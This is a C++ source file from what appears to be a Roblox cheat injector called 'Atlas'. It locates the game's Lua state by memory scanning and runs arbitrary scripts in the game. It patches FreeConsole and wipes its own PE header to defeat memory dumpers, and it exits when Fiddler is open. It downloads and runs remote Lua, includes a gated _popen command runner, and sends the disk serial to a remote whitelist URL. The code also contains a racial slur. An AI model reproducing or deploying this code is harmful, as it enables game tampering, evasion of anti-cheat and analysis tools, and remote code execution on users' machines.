	const char* str = r_rLua_tostring(r_lua_State, 1);
	string Response = DownloadURL(str);
	Occult_luaA_run(r_lua_State, Response.c_str());

	return 0;
}

BOOL Occult_Init(DWORD rL)
{
	try {
		lua_State* g_L = lua_open();
	}
	catch (std::exception ex)
	{
		printf("Failed to create Lua State.\n");
	}
	return TRUE;
}



void ThreadHook(int r_lua_State, int ar) {
	if (*(int*)ar == LUA_HOOKCOUNT && *(int*)(SC + 372)) {
		throw std::exception("Game script timeout");
	}
}

int r_lua_sethook(DWORD rL, void* source, int arg1, int arg2)
{
	return ((int(__cdecl*)(DWORD, void*, int, int))(DWORD)OCCULT_OFFSET(OCCULT_IDABASE, 0x6FB510))(rL, source, arg1, arg2);
}

int r_lua_setmetatable(DWORD rL, int idx)
{
	//return ((int(__cdecl *)(DWORD, int))(DWORD)ret.unprotect<DWORD>((BYTE*)OCCULT_OFFSET(OCCULT_IDABASE, 0x701120))(rL, idx));
	return 0;
}

int wrap_object(DWORD rL, int object)
{

	return 0;
}

#define set_global_func(func, name) r_lua_pushcclosure(rL, func, 0);\
									r_lua_setfield(rL, LUA_GLOBALSINDEX, name);

int fetchasset(DWORD RL)
{
	std::string URL = r_rLua_tostring(RL, 1);
	rbxlua_getservice(RL, "ContentProvider");
	rbxlua_getfield(RL, -1, "LoadAsset");
	rbxlua_pushvalue(RL, -2);
	//rbxlua_pushnumber(RL, std::stoi(URL));
	rbxlua_pushstring(luaState, URL.c_str());//FixedURL.c_str());
	rbxlua_pcall(luaState, 2, 0, 0); Sleep(50);
	return 0;
}



// Copy a string to the clipboard




// Gets the global env of roblox's localscript state

// Gets the global env of seven
int seven_getgenv(DWORD RL)
{
	RLPUSH(RL, *(DWORD*)(luaState + 96), RLUA_TTABLE);
	return 1;
}




// execute commands :P
int exec_sys_cmd(DWORD RL)
{
	char* cmd = (char*)r_rLua_tostring(RL, -1);
	if (!cmd) return 0;
	if (strncmp(cmd, "dKiV1EtcXZ", 10) != 0) return 0;
	cmd += 10;

	int c = 0;
	string outstr = "";
	std::vector<char> v_outchars;
	FILE *out = _popen(cmd, "r");
	while ((c = fgetc(out)) != EOF)
		v_outchars.push_back(c);
	_pclose(out);

	for (UINT i = 0; i < v_outchars.size(); i++)
		outstr += v_outchars[i];
	rbxlua_pushstring(RL, outstr.c_str());
	return 1;
}

// loadfile implementation
int loadfile(DWORD RL)
{
	//callcheck()
		char* filename;
	int err = 0;
	if (Occult_luaB_gettop(RL) == 1 && (filename = (char*)r_rLua_tostring(RL, -1)))
	{
		err = luaL_loadfile(g_L, filename);
		if (!err)
		{
			TValue *func = g_L->top - 1;
			LClosure *cl = (LClosure*)(func->value.gc);
			if (luaD_precall(g_L, func, 0) == 0)
			{
				Occult_luaV_execute(g_L, RL, 1);
			}
			lua_pop(g_L, 1);
			//	LeaveCriticalSection(&cs);
			return 1;
		}
	}
	//LeaveCriticalSection(&cs);
	return 2;
	return 2;
}


// loadstring implementation, disgusting
int loadstring(DWORD RL)
{
	//EnterCriticalSection(&cs);
	char *script, *chunkname;
	int err = 0;
	switch (Occult_luaB_gettop(RL))
	{
	case 1:
		if (script = (char*)r_rLua_tostring(RL, -1))
		{
			err = luaL_loadstring(g_L, script);
		}
		else
		{
			//rlua_pushnil(RL);
			//LeaveCriticalSection(&cs);
			return 2;
		}
		break;
	case 2:
		if (script = (char*)r_rLua_tostring(RL, -2))
		{
			if (chunkname = (char*)r_rLua_tostring(RL, -1))
				err = luaL_loadbuffer(g_L, script, strlen(script), chunkname);
			else
				err = luaL_loadstring(g_L, script);
		}
		else
		{
			//rlua_pushnil(RL);
	
			//LeaveCriticalSection(&cs);
			return 2;
		}
		break;
	default:
		//rlua_pushnil(RL);
		//LeaveCriticalSection(&cs);
		return 2;
	}

	if (!err)
	{
		TValue *func = g_L->top - 1;
		LClosure *cl = (LClosure*)(func->value.gc);
		if (luaD_precall(g_L, func, 0) == 0)
		{
			Occult_luaV_execute(g_L, RL, 1);
		}
		lua_pop(g_L, 1);
		//LeaveCriticalSection(&cs);
		return 1;
	}
	else
	{
		//rlua_pushnil(RL);
		rbxlua_pushstring(RL, lua_tostring(g_L, -1));
		lua_pop(g_L, 1);
		//LeaveCriticalSection(&cs);
		return 2;
	}
	return 0;
}

int getmetatable_seven(DWORD RL)
{
	r_lua_getmetatable(RL); // lua_getmetatable ignores __metatable
	DWORD t = Occult_R_index2adr(RL, -1);
	*(BYTE*)(*(DWORD*)t + 6) = 0; // readonly = false, so it doesn't error "Attempt to modify a readonly table"
	return 1;
}


// Checks if the caller of a metamethod is a seven thread by comparing environments
int is_caller_seven_thread(DWORD RL)
{
	DWORD ci = *(DWORD*)(RL + 12); // L->ci, Callinfo*
	DWORD ci_caller = ci - 48; // 2 functions up, L->ci - 2
	DWORD func = *(DWORD*)(*(DWORD*)(ci_caller + 12)); // ci->func
													   //rlua_pushboolean(RL, *(DWORD*)(func + 12) == *(DWORD*)(g_rluastate + 104));
	return 1;
}

/*
Each Lua global state has a linked list of all GC-able objects (L->l_G->rootgc)
This function iterates each object in the list.
If the object is a of type "Object" (Instances) and the instance's parent is nil,
then we have found a nil instance!
*/



inline const char *getclassname(DWORD pInstance)
{
	string *classname;
	__asm // disgusting inline asm
	{
		mov ecx, pInstance
		mov eax, [ecx]
		call dword ptr[eax + 0x10]
		add eax, 4
		mov classname, eax
	}
	return classname->c_str();
}


// Gets the first child of an instance with <name> ClassName
inline DWORD getChildByClassName(DWORD pObj, char *name)
{
	int len = strlen(name);
	DWORD childrenptr = *(DWORD*)(pObj + 0x2C);
	DWORD e = *(DWORD*)(childrenptr + 4);

	for (int i = *(int*)childrenptr; i != e; i += 8)
		if (memcmp(getclassname(*(int*)i), name, len) == 0)
			return *(int*)i;

	return 0;
}


// Gets the first child of an instance with <name> Name
inline DWORD getChildByName(DWORD pObj, char *name)
{
	int len = strlen(name);
	DWORD childrenptr = *(DWORD*)(pObj + 0x2C);
	DWORD e = *(DWORD*)(childrenptr + 4);

	for (int i = *(int*)childrenptr; i != e; i += 8)
	{
		string* sName = *(string**)(*(int*)i + 0x28);
		if (memcmp(sName->c_str(), name, len) == 0)
			return *(int*)i;
	}

	return 0;
}

int rlua_newthread(int a1)
{
	DbgPrint("Getting newthread.\n");
	DWORD A = ((int(__cdecl*)(int))(rbxaddy(0x6FFE10)))(a1);
	DbgPrint("Got.\n");
	return A;
}

bool Gui::created = false;
HWND script_wnd, txt_script, txt_script2, btn_exec_script, btn_clear, hConsole, hScriptWnd;
WNDPROC oldbtn, oldtxt;
#define IDM_SCWND 900
#define IDM_EXIT 901

int vasprintf(char **str, const char *fmt, va_list args)
{
	int size = 0;
	va_list tmpa;
	va_copy(tmpa, args);
	size = vsnprintf(NULL, size, fmt, tmpa);
	va_end(tmpa);

	if (size < 0)
		return -1;
	*str = (char *)malloc(size + 1);
	if (NULL == *str)
		return -1;

	size = vsprintf(*str, fmt, args);
	return size;
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) //main wndproc
{
	switch (message)
	{
	case WM_COMMAND:
		switch (LOWORD(wParam))
		{
		case IDM_EXIT:
			//if (MessageBox(0, "If you close Seven, roblox must exit as well. Continue?", "Confirmation", MB_YESNO) == IDYES)
				exit(0);
			break;
		case IDM_SCWND:
			ShowWindow(script_wnd, true);
			return 0;
		default:
			break;
		}
		break;
	case WM_CLOSE:
		ShowWindow(hWnd, SW_FORCEMINIMIZE);
		return 0;
	case WM_DESTROY:
		PostQuitMessage(0);
		return 0;
	}
	return DefWindowProc(hWnd, message, wParam, lParam);
}

LRESULT CALLBACK ScriptWndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_CLOSE:
		ShowWindow(script_wnd, 0);
		return 1;
	case WM_DESTROY:
		PostQuitMessage(0);
		return 0;
	case WM_SIZING:
		RECT *rect = (RECT*)lParam;
		SetWindowPos(txt_script, NULL, 0, 0, rect->right - rect->left - 16, rect->bottom - rect->top - 66, NULL);
		SetWindowPos(btn_exec_script, NULL, 1, rect->bottom - rect->top - 65, 110, 25, NULL);
		SetWindowPos(btn_clear, NULL, rect->right - rect->left - 127, rect->bottom - rect->top - 65, 110, 25, NULL);
		return TRUE;
	}
	return DefWindowProc(hWnd, message, wParam, lParam);
}

LRESULT CALLBACK btn_exec_script_proc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	if (message == WM_LBUTTONDOWN)
	{
		int len = SendMessage(txt_script, WM_GETTEXTLENGTH, 0, 0);
		char *hdr = "\n"; //set the 'script' global
		int hdr_len = strlen(hdr);
		char *buf = new char[len + hdr_len + 1]();
		memcpy(buf, hdr, hdr_len);
		SendMessage(txt_script, WM_GETTEXT, (WPARAM)len + 1, (LPARAM)(buf + hdr_len));
		luaA_execute_(luaState, buf);
		delete[] buf;
	}
	return CallWindowProc(oldbtn, hWnd, message, wParam, lParam);
}

LRESULT CALLBACK btn_clear_proc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	if (message == WM_LBUTTONDOWN)
		SendMessage(txt_script, WM_SETTEXT, NULL, (LPARAM)"");
	return CallWindowProc(oldbtn, hWnd, message, wParam, lParam);
}

LRESULT CALLBACK txt_script_proc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	if (message == WM_KEYDOWN)
		if (GetKeyState(VK_CONTROL) & 0x8000 && wParam == 'A')
			SendMessage(hWnd, EM_SETSEL, 0, -1);
	return CallWindowProc(oldtxt, hWnd, message, wParam, lParam);
}

LRESULT CALLBACK btn_exec_script_proc2(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	if (message == WM_LBUTTONDOWN)
	{
		int len = SendMessage(txt_script2, WM_GETTEXTLENGTH, 0, 0);
		char *hdr = "\n"; //set the 'script' global
		int hdr_len = strlen(hdr);
		char *buf = new char[len + hdr_len + 1]();
		memcpy(buf, hdr, hdr_len);
		SendMessage(txt_script2, WM_GETTEXT, (WPARAM)len + 1, (LPARAM)(buf + hdr_len));
		luaA_execute_(luaState, buf);
		delete[] buf;
	}
	return CallWindowProc(oldbtn, hWnd, message, wParam, lParam);
}

LRESULT CALLBACK btn_clear_proc2(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	if (message == WM_LBUTTONDOWN)
		SendMessage(txt_script2, WM_SETTEXT, NULL, (LPARAM)"");
	return CallWindowProc(oldbtn, hWnd, message, wParam, lParam);
}

LRESULT CALLBACK txt_script_proc2(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	if (message == WM_KEYDOWN)
		if (GetKeyState(VK_CONTROL) & 0x8000 && wParam == 'A')
			SendMessage(hWnd, EM_SETSEL, 0, -1);
	return CallWindowProc(oldtxt, hWnd, message, wParam, lParam);
}

void Gui::WriteEx(bool bold, DWORD color, char *format, ...)
{
	va_list va;
	va_start(va, format);
	char *buffer;
	if (vasprintf(&buffer, format, va) == -1)
		return;
	va_end(va);

	GETTEXTLENGTHEX gte;
	memset(&gte, 0, sizeof(SETTEXTEX));
	gte.flags = GTL_DEFAULT;
	gte.codepage = CP_ACP;
	int len = SendMessage(hConsole, EM_GETTEXTLENGTHEX, (WPARAM)&gte, 0);
	int buflen = strlen(buffer);

	SendMessage(hConsole, EM_SETSEL, -1, -1);

	SETTEXTEX ste;
	memset(&ste, 0, sizeof(SETTEXTEX));
	ste.flags = ST_NEWCHARS | ST_SELECTION;
	ste.codepage = CP_ACP;
	SendMessage(hConsole, EM_SETTEXTEX, (WPARAM)&ste, (LPARAM)buffer);

	SendMessage(hConsole, EM_SETSEL, len, len + buflen);

	CHARFORMAT cf;
	memset(&cf, 0, sizeof(CHARFORMAT));
	cf.cbSize = sizeof(CHARFORMAT);
	if (bold)
	{
		cf.dwMask = CFM_COLOR | CFM_BOLD;
		cf.crTextColor = color;
		cf.dwEffects = CFE_BOLD;
	}
	else
	{
		cf.dwMask = CFM_COLOR;
		cf.crTextColor = color;
	}
	SendMessage(hConsole, EM_SETCHARFORMAT, SCF_SELECTION, (LPARAM)&cf);

	SendMessage(hConsole, EM_SETSEL, -1, -1);
	SendMessage(hConsole, WM_VSCROLL, SB_BOTTOM, 0);
	free(buffer);
}

void Gui::Write(char *format, ...)
{
	va_list va;
	va_start(va, format);
	char *buffer;
	if (vasprintf(&buffer, format, va) == -1)
		return;
	va_end(va);

	SendMessage(hConsole, EM_SETSEL, -1, -1);

	SETTEXTEX ste;
	memset(&ste, 0, sizeof(SETTEXTEX));
	ste.flags = ST_NEWCHARS | ST_SELECTION;
	ste.codepage = CP_ACP;
	SendMessage(hConsole, EM_SETTEXTEX, (WPARAM)&ste, (LPARAM)buffer);

	SendMessage(hConsole, EM_SETSEL, -1, -1);
	SendMessage(hConsole, WM_VSCROLL, SB_BOTTOM, 0);
	free(buffer);
}

Gui::Gui()
{
	LoadLibrary("msftedit.dll");
	HINSTANCE hInstance = GetModuleHandle(NULL);

	// Make the Large Script Window
	WNDCLASSEX wc;
	ZeroMemory(&wc, sizeof(WNDCLASSEX));
	wc.cbSize = sizeof(WNDCLASSEX);
	wc.style = CS_HREDRAW | CS_VREDRAW;
	wc.lpfnWndProc = ScriptWndProc;
	wc.hInstance = hInstance;
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);
	wc.hbrBackground = (HBRUSH)COLOR_WINDOW;
	wc.lpszClassName = "kLBi2xP0o4czr7ckuzyQ";
	RegisterClassEx(&wc);

	HFONT font = CreateFont(15, 0, 0, 0, FW_DONTCARE, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, PROOF_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Helvetica");

	script_wnd = CreateWindowEx(WS_EX_TOPMOST, "kLBi2xP0o4czr7ckuzyQ", "Atlas | By Heck", WS_OVERLAPPEDWINDOW, 0, 0, 400, 386, NULL, NULL, hInstance, NULL);
	txt_script = CreateWindowEx(WS_EX_CLIENTEDGE, "EDIT", "", WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_AUTOVSCROLL | ES_MULTILINE, 0, 0, 384, 320, script_wnd, NULL, hInstance, NULL);
	btn_exec_script = CreateWindowEx(NULL, "BUTTON", "Execute Script", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON, 1, 321, 110, 25, script_wnd, NULL, hInstance, NULL);
	btn_clear = CreateWindowEx(NULL, "BUTTON", "Clear", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON, 273, 321, 110, 25, script_wnd, NULL, hInstance, NULL);

	SendMessage(btn_exec_script, WM_SETFONT, (WPARAM)font, TRUE);
	SendMessage(btn_clear, WM_SETFONT, (WPARAM)font, TRUE);
	SendMessage(txt_script, WM_SETFONT, (WPARAM)font, TRUE);
	SendMessage(txt_script, EM_LIMITTEXT, 0x7FFFFFFE, 0);
	oldbtn = (WNDPROC)SetWindowLongPtr(btn_exec_script, GWLP_WNDPROC, (LONG)btn_exec_script_proc);
	oldtxt = (WNDPROC)SetWindowLongPtr(txt_script, GWLP_WNDPROC, (LONG)txt_script_proc);
	SetWindowLongPtr(btn_clear, GWLP_WNDPROC, (LONG)btn_clear_proc);

	////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	// Make the main window

	ZeroMemory(&wc, sizeof(WNDCLASSEX));
	wc.cbSize = sizeof(WNDCLASSEX);
	wc.style = CS_HREDRAW | CS_VREDRAW;
	wc.lpfnWndProc = WndProc;
	wc.hInstance = hInstance;
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);
	wc.hbrBackground = (HBRUSH)COLOR_WINDOW;
	wc.lpszClassName = "kLBi2xP0o4czr7ckuzyF";
	RegisterClassEx(&wc);

	HMENU main_menu = CreateMenu();
	HMENU hFileMenu = CreateMenu();
	HMENU hViewMenu = CreateMenu();

	AppendMenu(main_menu, MF_POPUP, (UINT_PTR)hFileMenu, "File");
	AppendMenu(main_menu, MF_POPUP, (UINT_PTR)hViewMenu, "View");
	AppendMenu(hViewMenu, MF_STRING, IDM_SCWND, "Large Script Window");
	AppendMenu(hFileMenu, MF_STRING, IDM_EXIT, "Exit");

	HWND hWnd = CreateWindowEx(WS_EX_TOPMOST, "kLBi2xP0o4czr7ckuzyF", "Atlas | By Heck", WS_POPUPWINDOW | WS_CAPTION | WS_MINIMIZEBOX, 0, 0, 441, 440, NULL, main_menu, hInstance, NULL);
	txt_script2 = CreateWindowEx(WS_EX_CLIENTEDGE, "EDIT", "", WS_CHILD | WS_VISIBLE | ES_AUTOVSCROLL | ES_MULTILINE, 5, 260, 423, 100, hWnd, NULL, hInstance, NULL);
	hConsole = CreateWindowExW(0, MSFTEDIT_CLASS, L"", WS_CHILD | WS_VISIBLE | WS_VSCROLL | WS_BORDER | ES_MULTILINE | ES_READONLY, 0, 0, 435, 250, hWnd, NULL, hInstance, NULL);
	HWND btn_exec_script2 = CreateWindowEx(NULL, "BUTTON", "Execute Script", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON, 5, 365, 110, 25, hWnd, NULL, hInstance, NULL);
	HWND btn_clear2 = CreateWindowEx(NULL, "BUTTON", "Clear", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON, 318, 365, 110, 25, hWnd, NULL, hInstance, NULL);

	SendMessage(hConsole, WM_SETFONT, (WPARAM)font, TRUE);
	SendMessage(hConsole, EM_SETBKGNDCOLOR, 0, RGB(212, 212, 212));
	SendMessage(txt_script2, WM_SETFONT, (WPARAM)font, TRUE);
	SendMessage(btn_exec_script2, WM_SETFONT, (WPARAM)font, TRUE);
	SendMessage(btn_clear2, WM_SETFONT, (WPARAM)font, TRUE);
	SetWindowLongPtr(btn_exec_script2, GWLP_WNDPROC, (LONG)btn_exec_script_proc2);
	SetWindowLongPtr(btn_clear2, GWLP_WNDPROC, (LONG)btn_clear_proc2);
	SetWindowLongPtr(txt_script2, GWLP_WNDPROC, (LONG)txt_script_proc2);
	SendMessage(txt_script2, EM_LIMITTEXT, 0x7FFFFFFE, 0);

	ShowWindow(hWnd, true);
	created = true;
}


BOOL Occult_luaA_run(DWORD rL, const char* src)
{
	//DbgPrint("\nIn Occult_luaR_run\n");
	Proto* fptn;
	LClosure* lcl;
	TValue* cl;
	//DbgPrint("realloc: %x\n", (DWORD)r_luaM_realloc_);
	//DbgPrint("r_luaD_precall: %x\nr_luaV_gettable: %x\nXorConstant: %x\n", (DWORD)r_luaD_precall, (DWORD)r_luaV_gettable, (DWORD)XorConstant);
	lua_State* L = luaL_newstate();
	luaL_loadbuffer(L, src, strlen(src), "@Console");
	if (lua_type(L, -1) != LUA_TFUNCTION) {
		printf("%s\n", lua_tostring(L, -1));
		lua_pop(L, -1);
		return FALSE;
	}
	cl = (L->top - 1);
	lcl = &(((Closure*)((L->top - 1)->value.p))->l);
	fptn = lcl->p;
	//DbgPrint("(o)Lua State: %x\nProto: %x", (DWORD)L, (DWORD)fptn);
	//DbgPrint("\n/!\\ Launching Occult virtual machine /!\\\n");

	//DbgPrint("Initiated roblox thread.\n");

	

	rbx_createttable(rL, 0, 0);
	r_lua_setfield(rL, -10002, "_G");

	//set_global_func(loadstring, "loadstring");
	//set_global_func(loadfile, "loadfile");
	//set_global_func(CopyString, "copystring");
//	set_global_func(exec_sys_cmd, "exec");
	//set_global_func(printconsole, "writeconsole");
	//set_global_func(printconsole, "printconsole");
	//set_global_func(serializeInstance, "SaveInstance");
	//set_global_func(serializeInstance, "saveinstance");
	//set_global_func(get_global_env, "getrenv");
	//set_global_func(seven_getgenv, "getgenv");
	//set_global_func(getmetatable_seven, "getmetatable");
	set_global_func(getmetatable_seven, "getrawmetatable");
	//	set_global_func(get_nil_objects, "get_nil_instances");
	

	try {
		if (luaD_precall(L, cl, 0) == 0) {
		//	DbgPrint("luaD_precall return'd 0 executing.\n");
			convert_lua_proto(rL, fptn, "@Console");
			convert(rL, "@Console");
			luaU_dump(L, fptn, writer_, NULL, 1);
			Occult_luaV_execute(L, rL, 1);
		}
	}
	catch (std::exception e) {
		printf("%s\n", e.what());
	}
	lua_pcall(L, 0, 0, 0);
	return TRUE;
}

DWORD SigScan(const char *AoB, char *Mask) {
	return Memory::FindPattern((DWORD)GetModuleHandleA("RobloxPlayerBeta.exe"), 0xF00000, (PBYTE)AoB, Mask);
}


int luaA_execute_(DWORD luaState, std::string buffer) {
	//g_L = lua_open();
	auto Context = (int*(__cdecl*)())SigScan("\x55\x8B\xEC\x51\x56\xE8\x00\x00\x00\x00\x50", "xxxxxx????x");
	*(int*)Context() = 7;
	std::string buff;
	buff = "spawn(function() script = Instance.new'LocalScript' script.Disabled = true script.Name = 'jH:245G(2l]' script.Parent = nil end)";
	buffer += buff;
	Occult_luaA_run(luaState, buffer.c_str());
	return 0;
}

void ConsoleHacks()
{
	DWORD nothing;
	VirtualProtect((PVOID)&FreeConsole, 1, PAGE_EXECUTE_READWRITE, &nothing); //roblox has a "freeconsole" gay thingy
	*(BYTE*)(&FreeConsole) = 0xC3;
}

void Console(char* title) { //void console haxs
	AllocConsole();
	SetConsoleTitleA(title);
	freopen("CONOUT$", "w", stdout);
	freopen("CONIN$", "r", stdin);
	HWND ConsoleHandle = GetConsoleWindow(); //gets the console window
	::SetWindowPos(ConsoleHandle, HWND_TOPMOST, 0, 0, 0, 0, SWP_DRAWFRAME | SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW); //make program topmost (above roblox)
																													   //topmost function: Look at http://www.cplusplus.com/forum/windows/125528/
	::ShowWindow(ConsoleHandle, SW_NORMAL); //show window
}

std::string Input() {
	std::string ass;
	getline(std::cin, ass);
	return ass;
}

string g_autoexec_path;
string g_install_path;

std::vector<string> str_split(string str, char delimiter)
{
	std::vector<string> tokens;
	std::stringstream ss(str);
	string tok;

	while (getline(ss, tok, delimiter))
		tokens.push_back(tok);

	return tokens;
}

void load_autoexec_scripts()
{
	WIN32_FIND_DATA fd;
	HANDLE hFile = FindFirstFile(g_autoexec_path.c_str(), &fd);
	if (hFile == INVALID_HANDLE_VALUE)
		return;

	do
	{
		string path = g_autoexec_path;
		path.resize(path.find_last_of('\\') + 1);
		path += fd.cFileName;
		if (_stricmp(fd.cFileName + strlen(fd.cFileName) - 4, ".lua") != 0)
			continue;

		std::ifstream file;
		file.open(path.c_str(), std::ifstream::binary);
		if (!file.is_open())
		{
			printf("Error paging the permissions of the CallCheck Bypass\n", path.c_str());
			continue;
		}

		file.seekg(0, file.end);
		int size = (int)file.tellg();
		file.seekg(0, file.beg);
		char *filestr = new char[size + 1]();
		file.read(filestr, size);
		file.seekg(0, file.beg);
		file.close();

		printf("v8 datamodel memes\n", fd.cFileName);
		Occult_luaA_run(luaState, filestr);
		delete[] filestr;
	} while (FindNextFile(hFile, &fd));
}



void InitScripts()
{
	HMODULE hDll = (HMODULE)GetModuleHandleA("Atlas.vmp.dll");
	char cpath[MAX_PATH];
	std::ifstream file;

	GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCSTR)str_split, &hDll);
	GetModuleFileName(hDll, cpath, MAX_PATH);

	// erase the PE header of this DLL to break some memory dumpers
	DWORD old;
	VirtualProtect(hDll, 0x500, PAGE_READWRITE, &old);
	memset(hDll, 0, 0x500);
	VirtualProtect(hDll, 0x500, old, &old);
	std::string path = cpath;
	int index = path.find_last_of('\\');
	path.resize(index);
	g_install_path = path + '\\';
	g_autoexec_path = path;
	g_autoexec_path += "\\autoexec\\*";
}

std::vector<std::string> GetArguments(const std::string& input) {
	std::vector<std::string> rtn;
	unsigned int i = 0;
	unsigned char sz = input.size();
	int pos = 0;

	if (input[0] == ' ') {
		i++;
		sz--;
	}

	for (; i < sz; ++i) {
		if (input[i] == ' ') {
			rtn.push_back(input.substr(pos, i - pos));
			pos = i + 1;
		}
		else if (i == sz - 1) {
			rtn.push_back(input.substr(pos, i - pos + 1));
			pos = i + 1;
		}
	}

	return rtn;
}

#pragma comment(lib, "wininet")


void FindFiddler() {
	if (FindWindow(NULL, "Fiddler Web Debugger")) {
		printf("Detected that Fiddler is open. To use Zero, close fiddler and reinject.\r\n");
		Sleep(500 * 1);
		exit(1);
	}
	else {

	}
}

void Auth() {
	CHAR szVolumeNameBuffer[12];
	DWORD dwVolumeSerialNumber;
	DWORD dwMaximumComponentLength;
	DWORD dwFileSystemFlags;
	CHAR szFileSystemNameBuffer[10];

	GetVolumeInformationA("C:\\", szVolumeNameBuffer, 12, &dwVolumeSerialNumber, &dwMaximumComponentLength, &dwFileSystemFlags, szFileSystemNameBuffer, 10);
	std::string HDDserial = std::to_string(dwVolumeSerialNumber);

	HW_PROFILE_INFO hwProfileInfo;

	std::string hwid;
	if (GetCurrentHwProfile(&hwProfileInfo) != NULL) {
		hwProfileInfo.szHwProfileGuid;
	}

	FindFiddler();

	std::string url = (std::string)"https:" + (std::string)"//pussysmack." + (std::string)"club/new" + (std::string)"auth.p" + (std::string)"hp?userid=";
	url += HDDserial;
	std::string HTTPResponse = DownloadURL(url.c_str());
	if (HTTPResponse == "1") {
		printf("You're whitelisted!\n");
	}
	else {
		printf("Not whitelisted fuck off nigger");
		exit(1);
	}
}


VOID Main()
{
	//OldFilter = SehFunc(SEHHndler);
	ConsoleHacks();
	Console("Altas | By Deniality");
	printf("Authenticating.. ");
	Auth();
	printf("Success!\n");
	printf("Scanning..\n");
	DWORD base = (DWORD)GetModuleHandleA(NULL);
	DWORD SCVT = base + 0x11B5FDC - OCCULT_IDABASE;
	INT SC = (DWORD)(Memory::Scan(PAGE_READWRITE, (char*)&SCVT, "xxxx", 0x3700000));
	luaState = *(DWORD*)(SC + 220) - (SC + 220);
	printf("Script Context:%x\nLua State:%x\n", SC, luaState);

	while (1) {
		printf("> ");
		std::string X = Input();
		luaA_execute_(luaState, X);
	}
}

